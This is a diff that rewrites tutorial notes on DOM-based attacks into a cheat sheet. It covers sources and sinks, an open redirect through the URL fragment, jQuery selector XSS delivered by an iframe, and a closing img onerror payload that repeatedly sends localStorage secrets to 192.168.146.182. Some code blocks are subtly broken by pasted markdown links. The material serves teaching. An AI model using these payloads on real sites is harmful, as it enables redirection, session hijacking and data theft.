@@ -1,55 +1,79 @@
-The Source and the Sink
+## 🚰 DOM Sources and Sinks
 
-As mentioned before, all DOM-based attacks start with untrusted user input making its way to JavaScript that modifies the DOM. To simplify the detection of these issues, we refer to them as sources and sinks. A source is the location where untrusted data is provided by the user to a JavaScript function, and the sink is the location where the data is used in JavaScript to update the DOM. If there is no sanitisation or validation performed on the data between the source and sink, it can lead to a DOM-based attack. Let's reuse the two examples above to define the sources and sinks:
-
-Example
-Source
-Sink
-User clicking a tab on the navigation pane
-When the user clicks the new tab, a developer may update the URL with a #tabname2 to indicate the tab that the user currently has active.
-A JavaScript function executes on the event that the URL has been updated, recovers the updated tab information, and displays the correct tab.
-User filtering the results of a table
-The input provided in a textbox by the user is used to filter the results.
-A JavaScript function executes on the event that the information within the textbox updates and uses the information provided in the textbox to filter the dataset.
-The first example is quite interesting. Even though the initial user input was a mouse click, this was translated by the developers in an update to the URL. Using the # operator in the URL is common practice and is referred to as a fragment. Have you ever read a blog post, decided to send the URL to a friend, and when they opened the link, it opened at exactly the point you were reading? This occurs because JavaScript code updates the # portion of the URL as you are reading the article to indicate the heading closest to where you are in the article. When you send the URL, this information is also sent, and once the blog post is loaded, JavaScript recovers this information and automatically scrolls the page to your location. In our example, if you were to send the link to someone, once they opened it, they would view the same tab as you did when creating the link. While this is great for the user experience, it could lead to DOM-based attacks without proper validation of the data injected into the URL. With this in mind, let's look at a DOM-based attack example.
-
-DOM-based Open Redirection
-
-Let's say that the frontend developers are using information from the # value to determine the location of navigation for the web application. This can lead to a DOM-based open redirect. Let's take a look at an example of this in JavaScript code:
-
-goto = location.hash.slice(1) if (goto.startsWith('https:')) {   location = goto; }
-
-The source in this example is the location.hash.slice(1) parameter which will take the first # element in the URL. Without sanitisation, this value is directly set in the location of the DOM, which is the sink. We can construct the following URL to exploit the issue:
-
-https://realwebsite.com/#https://attacker.com
-
-Once the DOM loads, the JavaScript will recover the # value of https://attacker.com and perform a redirect to our malicious website. This is quite a tame example. While there are other examples as well, the one we care about is DOM-based XSS.
-
-There are other types of DOM-based attacks, but the principle for all of these remain the same where user input is used directly in a JavaScript element without sanitisation or validation, allow threat actors to control a part of the DOM.
+All DOM-based attacks originate from untrusted user input interacting with JavaScript that modifies the Document Object Model. Detection relies on identifying sources and sinks. A source is the entry point of untrusted user data into a JavaScript execution context. A sink is the execution point where data modifies the DOM. Absence of sanitization or validation between source and sink enables exploitation.
 
 
 
-DOM-based XSS via jQuery
+| Context | Source | Sink |
+|---|---|---|
+| Navigation Tab | URL fragment updated to indicate active tab. | JavaScript triggers on URL update, extracting tab state to render component. |
+| Data Filtering | Textbox input provided by client. | JavaScript triggers on textbox update, applying input to filter dataset. |
 
-Continuing with our web page location example, let's take a look at the following jQuery example to navigate the page to the last viewed location:
+The URL fragment operator is commonly utilized to maintain state or position. Parsing fragment data without strict validation introduces DOM-based vulnerabilities.
+
+## ↪️ DOM-Based Open Redirection
+
+Navigation logic relying on fragment values can be manipulated for arbitrary redirection.
+
+```javascript
+# Extract fragment value and redirect client if URL begins with https:
+goto = location.hash.slice(1);
+if (goto.startsWith('https:')) {
+   location = goto;
+}
+```
+* Tool: Client-side JavaScript
+
+The source `location.hash.slice(1)` extracts the fragment. It is directly assigned to the DOM `location` sink without sanitization.
+
+```text
+# Malicious URL structure to force redirection
+[https://realwebsite.com/#https://attacker.com](https://realwebsite.com/#https://attacker.com)
+```
+* Tool: Web Browser
+
+Upon DOM load, the script extracts the target URL and forces a client-side redirect to the attacker-controlled domain.
+
+## 💉 DOM-Based XSS via jQuery
+
+Framework-specific sinks, such as jQuery selectors, present additional DOM exploitation vectors.
+
+```javascript
+# jQuery event listener passing fragment data into a selector sink
 $(window).on('hashchange', function() {
-	var element = $(location.hash);
-	element[0].scrollIntoView();
+    var element = $(location.hash);
+    element[0].scrollIntoView();
 });
-Since the hash value is a source that we have access to, we can inject an XSS payload into jQuery's $() selector sink. For example, if we were able to set the URL as follows:
+```
+* Tool: Client-side JavaScript
 
-https://realwebsite.com#<img src=1 onerror=alert(1)></img>
+The fragment value is passed into the `$()` selector sink. Direct URL injection results in self-XSS:
 
-However, this would only allow us to XSS ourselves. To perform XSS on other users, we need to find a way to trigger the hashchange function automatically. The simplest option would be to leverage an iFrame to deliver our payload:
+```text
+# Direct XSS payload injection via URL fragment
+[https://realwebsite.com](https://realwebsite.com)#<img src=1 onerror=alert(1)></img>
+```
+* Tool: Web Browser
 
-<iframe src="https://realwebsite.com#" onload="this.src+='<img src=1 onerror=alert(1)>'
+Weaponization against external targets requires an automated trigger mechanism. An iframe can force a `hashchange` event on the victim's client.
 
-Once the website is loaded, the src value is updated to now include our XSS payload, triggering the hashchange function and, thus, our XSS payload.
+```html
+# Delivery mechanism via iframe to trigger hashchange on target
+<iframe src="[https://realwebsite.com](https://realwebsite.com)#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+* Tool: Malicious Web Server
 
-This is one example of how XSS can be performed. However, several other sinks could be used. This includes normal JavaScript sinks and framework-specific ones such as those for jQuery and Angular. For a complete list of the available sinks, you can visit this page. As shown above, the tricky part lies in the weaponisation of DOM-based XSS. Without proper weaponisation, we are simply performing XSS on ourselves, which has no value. This is a key issue with DOM-based XSS. Luckily, weaponising can be performed through the conventional XSS channels!
+## ⚖️ DOM-Based vs Conventional XSS
 
-DOM-Based XSS vs Conventional XSS
+Vulnerability classification depends on sink location.
 
-When you are looking for XSS, while it may seem to be normal stored or reflected XSS. In some cases, it may actually be stored or reflected DOM-based XSS. The key difference is where the sink resides. If the untrusted user data is already injected into the sink server side and the response contains the payload, then it is conventional XSS. However, if the DOM is fully loaded and then receives untrusted user data that is loaded in through JavaScript, it is DOM-based. While there may not be a difference in the exploitation of XSS, there is a difference in how the XSS should be remediated. In the former, server-side HTML entity encoding should be used. However, in the latter, a deeper investigation into the exact JavaScript function that loads the data is required. In most cases, a different function should be used.
+* Conventional XSS: Untrusted data is injected server-side. The initial HTTP response contains the malicious payload. Remediation requires robust server-side HTML entity encoding.
+* DOM-Based XSS: The DOM loads completely, then dynamically receives and processes untrusted data via client-side JavaScript. Remediation requires substituting vulnerable JavaScript functions with safer alternatives or implementing strict client-side validation.
 
-<img src=1 onerror="setInterval(()=>{fetch('http://192.168.146.182:8000?secret='+localStorage.getItem('secret'))},5000)">
+Below is an advanced DOM-based payload utilizing the fetch API for continuous data exfiltration:
+
+```html
+# Image vector utilizing setInterval to persistently exfiltrate local storage via HTTP GET
+<img src=1 onerror="setInterval(()=>{fetch('[http://192.168.146.182:8000?secret='+localStorage.getItem('secret](http://192.168.146.182:8000?secret='+localStorage.getItem('secret)'))},5000)">
+```
+* Tool: XSS Payload Delivery
